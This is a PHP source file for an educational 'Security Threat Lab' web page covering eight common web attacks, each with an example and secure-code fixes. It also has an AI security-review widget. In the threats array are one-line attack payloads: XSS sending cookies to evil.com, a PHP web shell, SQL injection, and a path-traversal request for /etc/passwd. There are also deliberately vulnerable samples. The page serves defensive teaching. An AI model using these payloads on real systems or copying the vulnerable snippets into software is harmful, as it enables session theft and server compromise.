<?php
require_once __DIR__ . '/../../includes/header.php';
$page_title = 'Security Threat Lab — Innovation Lab — ' . APP_NAME;

$threats = [
  ['SQL Injection','fa-database','#EF4444','Critical','A malicious user inserts SQL code into an input field to manipulate the database.',
   'The attacker enters: \' OR \'1\'=\'1 into a login form, bypassing authentication.',
   'Use PDO prepared statements, never concatenate user input into queries. Validate all inputs.',
   '<?php // VULNERABLE:\n$sql = "SELECT * FROM users WHERE email = \'".$_POST[\'email\']."\'"; // NEVER DO THIS\n\n// SAFE:\n$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");\n$stmt->execute([$_POST[\'email\']]);?>'],

  ['XSS (Cross-Site Scripting)','fa-code','#F97316','High','Attacker injects malicious scripts into pages viewed by other users.',
   '<script>document.location="https://evil.com?c="+document.cookie</script> in a comment field.',
   'Always escape output with htmlspecialchars(). Use Content-Security-Policy headers. Never use innerHTML with user content.',
   '<?php // VULNERABLE:\necho $_GET[\'name\']; // NEVER DO THIS\n\n// SAFE:\necho htmlspecialchars($_GET[\'name\'], ENT_QUOTES, \'UTF-8\');?>'],

  ['CSRF (Cross-Site Request Forgery)','fa-arrows-rotate','#F5A800','High','Tricks authenticated users into submitting unintended requests.',
   'A hidden form on evil.com submits a bank transfer while the victim is logged in.',
   'Generate a unique CSRF token per session. Validate on every state-changing request. Use SameSite cookies.',
   '<?php // Generate:\n$_SESSION[\'csrf\'] = bin2hex(random_bytes(32));\n\n// Validate:\nif ($_POST[\'csrf\'] !== $_SESSION[\'csrf\']) die(\'Invalid CSRF\');?>'],

  ['Brute Force / Rate Limiting','fa-bolt','#EF4444','High','Automated attempts to guess passwords or abuse API endpoints.',
   'Attacker sends 10,000 login attempts per minute to find valid credentials.',
   'Implement rate limiting by IP. Lock accounts after failed attempts. Use CAPTCHA. Enforce strong passwords.',
   '<?php // Track attempts in DB:\n$stmt = $pdo->prepare("SELECT COUNT(*) FROM rate_limits WHERE ip=? AND created_at > DATE_SUB(NOW(),INTERVAL 15 MINUTE)");\n$stmt->execute([$_SERVER[\'REMOTE_ADDR\']]);\nif ($stmt->fetchColumn() > 10) die(\'Too many attempts\');?>'],

  ['Insecure File Upload','fa-upload','#A855F7','High','Attacker uploads malicious files (PHP shells, malware) via file upload forms.',
   'Upload a file named shell.php containing <?php system($_GET[\'cmd\']); ?> to execute commands.',
   'Validate MIME type server-side. Rename files. Store outside web root. Never execute uploaded files. Scan with antivirus.',
   '<?php // SAFE upload:\n$ext = strtolower(pathinfo($_FILES[\'f\'][\'name\'], PATHINFO_EXTENSION));\n$allowed = [\'jpg\',\'png\',\'pdf\'];\nif (!in_array($ext, $allowed)) die(\'Invalid file type\');\n$newName = bin2hex(random_bytes(16)).".".$ext;\nmove_uploaded_file($_FILES[\'f\'][\'tmp_name\'], UPLOAD_PATH.$newName);?>'],

  ['Sensitive Data Exposure','fa-eye','#3B82F6','Medium','Exposing passwords, API keys, PII in logs, source code, or unencrypted storage.',
   'Storing passwords in plain text or committing .env files to public Git repositories.',
   'Hash passwords with password_hash(). Use .env for secrets. Add .gitignore. Encrypt sensitive DB fields. Use HTTPS everywhere.',
   '<?php // Store passwords:\n$hash = password_hash($password, PASSWORD_BCRYPT, [\'cost\'=>12]);\n\n// Verify:\nif (password_verify($input, $hash)) { /* login ok */ }?>'],

  ['Session Hijacking','fa-id-badge','#22C55E','High','Attacker steals a valid session token to impersonate a logged-in user.',
   'Session token in URL: example.com/dashboard?PHPSESSID=abc123 can be stolen from browser history.',
   'Use HttpOnly and Secure cookie flags. Regenerate session ID on login. Set short session timeouts. Never put session IDs in URLs.',
   '<?php // Secure session:\nini_set(\'session.cookie_httponly\', 1);\nini_set(\'session.cookie_secure\', 1);\nsession_start();\n// On login:\nsession_regenerate_id(true);?>'],

  ['Directory Traversal','fa-folder-open','#F97316','Medium','Attacker accesses files outside the web root using ../ in file paths.',
   'Request: /download.php?file=../../etc/passwd to read system password file.',
   'Validate file paths with realpath(). Never trust user input for file operations. Use basename() to strip directory components.',
   '<?php // VULNERABLE:\nreadfile($_GET[\'file\']); // NEVER\n\n// SAFE:\n$base = realpath(\'/var/app/files/\');\n$file = realpath($base.\'/\'.basename($_GET[\'file\']));\nif (strpos($file, $base) === 0) readfile($file); else die(\'Access denied\');?>'],
];
?>

<section class="kw-page-hero">
  <div class="kw-container">
    <div class="kw-breadcrumb"><a href="<?= url() ?>">Home</a><i class="fa-solid fa-chevron-right"></i><a href="<?= url('innovation-lab') ?>">Innovation Lab</a><i class="fa-solid fa-chevron-right"></i><span class="current">Security Threat Lab</span></div>
    <div data-aos="fade-up" style="padding-bottom:2rem;">
      <span class="label" style="background:#EF444420;color:#EF4444;"><i class="fa-solid fa-shield-halved"></i> Security Education</span>
      <h1>Security Threat Lab</h1>
      <p>Understand common web application attacks with real examples, how they work, and how to defend against them. Educational use only — be a better developer.</p>
    </div>
  </div>
</section>

<section style="background:var(--kw-bg);padding:2rem 0 4rem;">
  <div class="kw-container">

    <!-- Stats / severity legend -->
    <div style="display:flex;gap:0.75rem;flex-wrap:wrap;margin-bottom:2rem;" data-aos="fade-up">
      <?php foreach ([['#EF4444','Critical',1],['#EF4444','High',5],['#F5A800','Medium',2]] as $s): ?>
      <div style="background:<?= $s[0] ?>15;border:1px solid <?= $s[0] ?>30;border-radius:999px;padding:0.3rem 1rem;font-size:0.75rem;font-weight:700;color:<?= $s[0] ?>;">
        <?= $s[2] ?> <?= $s[1] ?> <?= $s[2]===1?'Severity':'Severities' ?>
      </div>
      <?php endforeach; ?>
      <div style="margin-left:auto;font-size:0.78rem;color:var(--kw-text-muted);display:flex;align-items:center;gap:0.35rem;">
        <i class="fa-solid fa-circle-info" style="color:var(--kw-primary);"></i>
        Click any card to explore the threat
      </div>
    </div>

    <!-- Interactive threat cards -->
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:1.25rem;">
      <?php foreach ($threats as $i => $t):
        $severityColor = $t[3]==='Critical'?'#DC2626':($t[3]==='High'?'#EF4444':'#F5A800');
      ?>
      <div class="kw-card threat-card" data-index="<?= $i ?>" style="cursor:pointer;transition:all 0.25s;padding:1.5rem;border-top:3px solid <?= $t[2] ?>;"
           onclick="TL.open(<?= $i ?>)"
           onmouseover="this.style.transform='translateY(-4px)';this.style.boxShadow='0 12px 32px <?= $t[2] ?>20'"
           onmouseout="this.style.transform='';this.style.boxShadow=''">
        <div style="display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:0.85rem;">
          <div style="width:44px;height:44px;border-radius:10px;background:<?= $t[2] ?>15;display:flex;align-items:center;justify-content:center;">
            <i class="fa-solid <?= $t[1] ?>" style="color:<?= $t[2] ?>;font-size:1.1rem;"></i>
          </div>
          <span style="background:<?= $severityColor ?>15;color:<?= $severityColor ?>;border:1px solid <?= $severityColor ?>30;border-radius:999px;padding:0.15rem 0.6rem;font-size:0.65rem;font-weight:700;text-transform:uppercase;"><?= $t[3] ?></span>
        </div>
        <h3 style="font-size:0.95rem;margin-bottom:0.4rem;"><?= $t[0] ?></h3>
        <p style="font-size:0.8rem;color:var(--kw-text-muted);line-height:1.5;margin-bottom:0.85rem;"><?= $t[4] ?></p>
        <div style="font-size:0.75rem;color:<?= $t[2] ?>;font-weight:600;">
          <i class="fa-solid fa-arrow-right"></i> See attack example & defence →
        </div>
      </div>
      <?php endforeach; ?>
    </div>

    <!-- AI Security Advisor -->
    <div class="kw-card" style="padding:2rem;margin-top:2.5rem;border-top:3px solid #A855F7;">
      <div style="display:grid;grid-template-columns:1fr auto;gap:1.5rem;align-items:flex-start;flex-wrap:wrap;">
        <div>
          <h3 style="margin-bottom:0.4rem;"><i class="fa-solid fa-shield-halved" style="color:#A855F7;"></i> AI Security Advisor</h3>
          <p style="font-size:0.85rem;color:var(--kw-text-muted);">Describe your system or paste a code snippet. Get an AI security review with vulnerabilities identified and fixes suggested.</p>
        </div>
        <span style="background:#A855F720;color:#A855F7;border:1px solid #A855F730;border-radius:999px;padding:0.25rem 0.85rem;font-size:0.72rem;font-weight:700;">Powered by Krest AI</span>
      </div>
      <div style="margin-top:1.25rem;">
        <textarea id="security-input" rows="6" placeholder="Paste PHP/JS code or describe your architecture: e.g. 'I have a login form that sends email and password via POST to login.php which runs a MySQL query...'"
                  style="width:100%;resize:vertical;background:var(--kw-bg-alt);border:1px solid var(--kw-border);border-radius:var(--kw-radius-md);padding:1rem;font-family:monospace;font-size:0.82rem;color:var(--kw-text-secondary);outline:none;"
                  onfocus="this.style.borderColor='#A855F7'" onblur="this.style.borderColor=''"></textarea>
        <div style="display:flex;gap:0.65rem;margin-top:0.75rem;flex-wrap:wrap;">
          <button onclick="TL.runSecurityReview()" class="kw-btn kw-btn-lg" style="background:linear-gradient(135deg,#7C3AED,#A855F7);color:#fff;border:none;">
            <i class="fa-solid fa-shield-halved"></i> Run Security Review
          </button>
          <button onclick="document.getElementById('security-input').value=TL.sampleCode()" class="kw-btn kw-btn-ghost">Load Sample Code</button>
        </div>
        <div id="security-review-output" style="display:none;margin-top:1.25rem;padding:1.5rem;background:var(--kw-bg-alt);border:1px solid var(--kw-border);border-radius:var(--kw-radius-md);font-size:0.875rem;color:var(--kw-text-secondary);line-height:1.75;"></div>
      </div>
    </div>
  </div>
</section>

<!-- Threat Detail Modal -->
<div id="threat-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:9000;overflow-y:auto;padding:2rem 1rem;" onclick="if(event.target===this)TL.close()">
  <div style="max-width:720px;margin:0 auto;" id="threat-modal-body"></div>
</div>

<script>
const THREATS = <?= json_encode(array_map(fn($t)=>[
  'name'=>$t[0],'icon'=>$t[1],'color'=>$t[2],'severity'=>$t[3],
  'description'=>$t[4],'example'=>$t[5],'defence'=>$t[6],'code'=>$t[7]
], $threats)) ?>;

const TL = {
  open(i) {
    const t = THREATS[i];
    const modal = document.getElementById('threat-modal');
    document.getElementById('threat-modal-body').innerHTML = `
      <div class="kw-card" style="padding:0;overflow:hidden;">
        <div style="background:${t.color};padding:1.5rem 2rem;display:flex;align-items:center;gap:1rem;">
          <div style="width:52px;height:52px;border-radius:12px;background:rgba(0,0,0,0.2);display:flex;align-items:center;justify-content:center;flex-shrink:0;">
            <i class="fa-solid ${t.icon}" style="font-size:1.3rem;color:#fff;"></i>
          </div>
          <div>
            <h2 style="color:#fff;margin-bottom:0.25rem;">${t.name}</h2>
            <span style="background:rgba(0,0,0,0.25);color:#fff;border-radius:999px;padding:0.15rem 0.65rem;font-size:0.7rem;font-weight:700;">${t.severity} Severity</span>
          </div>
          <button onclick="TL.close()" style="margin-left:auto;background:rgba(0,0,0,0.2);border:none;color:#fff;width:32px;height:32px;border-radius:50%;cursor:pointer;font-size:1rem;flex-shrink:0;">✕</button>
        </div>
        <div style="padding:2rem;">
          <h4 style="margin-bottom:0.65rem;color:var(--kw-text-primary);">What is it?</h4>
          <p style="font-size:0.875rem;color:var(--kw-text-secondary);margin-bottom:1.5rem;">${t.description}</p>

          <h4 style="margin-bottom:0.65rem;color:#EF4444;"><i class="fa-solid fa-skull-crossbones"></i> Attack Example</h4>
          <div style="background:#EF444410;border:1px solid #EF444430;border-left:4px solid #EF4444;border-radius:8px;padding:1rem 1.25rem;margin-bottom:1.5rem;font-size:0.82rem;color:var(--kw-text-secondary);font-family:monospace;white-space:pre-wrap;">${escHtml(t.example)}</div>

          <h4 style="margin-bottom:0.65rem;color:#22C55E;"><i class="fa-solid fa-shield-halved"></i> How to Defend</h4>
          <p style="font-size:0.875rem;color:var(--kw-text-secondary);margin-bottom:1.5rem;">${t.defence}</p>

          <h4 style="margin-bottom:0.65rem;color:var(--kw-primary);"><i class="fa-solid fa-code"></i> Secure Code Example</h4>
          <div style="position:relative;">
            <pre style="background:var(--kw-bg-alt);border:1px solid var(--kw-border);border-radius:8px;padding:1.25rem;font-size:0.78rem;color:#A5F3FC;overflow-x:auto;margin:0;">${escHtml(t.code)}</pre>
            <button onclick="navigator.clipboard.writeText(THREATS[${i}].code);window.Krest?.toast('Copied!','success')" style="position:absolute;top:0.5rem;right:0.5rem;background:var(--kw-primary);color:#0A0F1A;border:none;border-radius:4px;padding:0.2rem 0.5rem;font-size:0.65rem;font-weight:700;cursor:pointer;">COPY</button>
          </div>

          <div style="margin-top:1.5rem;display:flex;gap:0.65rem;flex-wrap:wrap;">
            <button onclick="TL.close()" class="kw-btn kw-btn-ghost">← Back to Lab</button>
            <button onclick="TL.askAI('${t.name}')" class="kw-btn" style="background:linear-gradient(135deg,#7C3AED,#A855F7);color:#fff;border:none;">
              <i class="fa-solid fa-wand-magic-sparkles"></i> Ask AI About This
            </button>
          </div>
          <div id="modal-ai-response" style="display:none;margin-top:1rem;padding:1rem;background:var(--kw-bg-alt);border:1px solid var(--kw-border);border-radius:8px;font-size:0.85rem;color:var(--kw-text-secondary);line-height:1.7;"></div>
        </div>
      </div>
    `;
    modal.style.display = 'block';
    document.body.style.overflow = 'hidden';
  },
  close() {
    document.getElementById('threat-modal').style.display = 'none';
    document.body.style.overflow = '';
  },
  async askAI(threatName) {
    const aiDiv = document.getElementById('modal-ai-response');
    aiDiv.style.display = 'block';
    aiDiv.innerHTML = '<i class="fa-solid fa-spinner fa-spin" style="color:var(--kw-primary);"></i> Getting expert analysis...';
    try {
      const resp = await fetch('<?= url('api/ai-assistant') ?>', {
        method:'POST', headers:{'Content-Type':'application/json','X-CSRF-Token':document.querySelector('meta[name="csrf-token"]')?.content||''},
        body:JSON.stringify({messages:[{role:'user',content:`Explain ${threatName} in the context of PHP/MySQL web apps. Give 3 real-world scenarios and the most important prevention tips for a developer team.`}],system:'You are a senior application security expert. Be practical and specific. Use bullet points.'})
      });
      const data = await resp.json();
      aiDiv.innerHTML = (data.data?.reply||'No response.').replace(/\n/g,'<br>').replace(/\*\*(.*?)\*\*/g,'<strong>$1</strong>');
    } catch(e) { aiDiv.textContent = 'AI unavailable. Try again.'; }
  },
  async runSecurityReview() {
    const input = document.getElementById('security-input').value.trim();
    if (!input) { window.Krest?.toast('Enter code or describe your system first','warning'); return; }
    const output = document.getElementById('security-review-output');
    output.style.display = 'block';
    output.innerHTML = '<i class="fa-solid fa-spinner fa-spin" style="color:#A855F7;"></i> Analysing for security vulnerabilities...';
    try {
      const resp = await fetch('<?= url('api/ai-assistant') ?>', {
        method:'POST', headers:{'Content-Type':'application/json','X-CSRF-Token':document.querySelector('meta[name="csrf-token"]')?.content||''},
        body:JSON.stringify({messages:[{role:'user',content:`Review this for security vulnerabilities:\n\n${input}\n\nIdentify: vulnerabilities found, severity, specific fix for each.`}],system:'You are an OWASP security expert. Be specific. Format: list each vulnerability with severity badge and exact fix.'})
      });
      const data = await resp.json();
      output.innerHTML = (data.data?.reply||'No issues found or analysis failed.').replace(/\n/g,'<br>').replace(/\*\*(.*?)\*\*/g,'<strong>$1</strong>');
    } catch(e) { output.textContent = 'Security review failed. Check connection.'; }
  },
  sampleCode() {
    return `<?php\n$email = $_POST['email'];\n$pass  = $_POST['password'];\n$sql   = "SELECT * FROM users WHERE email='".$email."' AND password='".$pass."'";\n$result = mysqli_query($conn, $sql);\nif (mysqli_num_rows($result)) {\n    $_SESSION['user'] = $email;\n    echo "Welcome ".$email;\n}`;
  }
};
function escHtml(s){const d=document.createElement('div');d.textContent=String(s||'');return d.innerHTML;}
</script>
<?php require_once __DIR__ . '/../../includes/footer.php'; ?>